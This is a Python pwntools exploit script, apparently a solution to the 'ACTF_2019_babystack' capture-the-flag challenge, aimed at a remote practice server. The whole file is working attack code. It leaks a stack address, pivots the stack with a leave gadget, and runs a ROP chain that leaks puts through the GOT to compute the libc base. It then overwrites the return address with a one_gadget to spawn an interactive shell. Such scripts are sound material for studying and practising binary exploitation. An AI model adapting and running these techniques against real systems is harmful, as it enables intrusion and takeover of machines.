from pwn import *

#context.log_level = 'debug'

pn = './ACTF_2019_babystack'

#p = process(pn)
p = remote('node4.buuoj.cn', 28726)
elf = ELF(pn)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.buu.so')
#gdb.attach(p, 'b *0x400a18')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x400ad3
leave = 0x400a18
ret = 0x400709
main = 0x4008f6

p.sendlineafter(b'How many bytes of your message?\n', str(0xe0).encode())

p.recvuntil(b'Your message will be saved at ')

stack = int(p.recv(14), 16)

print('[+] rsp -> {}'.format(hex(stack)))

payload = b'a' * 0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
payload = payload.ljust(0xd0) + p64(stack) + p64(leave)

p.sendafter(b'\n>', payload)

p.recvuntil('Byebye~\n')
puts_real_addr = u64(p.recv(6).ljust(8, b'\0'))
libc_base = puts_real_addr - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

one_gadget = libc_base + 0x4f2c5

p.sendlineafter(b'How many bytes of your message?\n', str(0xe0).encode())

payload = b'a' * ( 0xd8 ) + p64(one_gadget)
p.sendafter(b'\n>', payload)

p.interactive()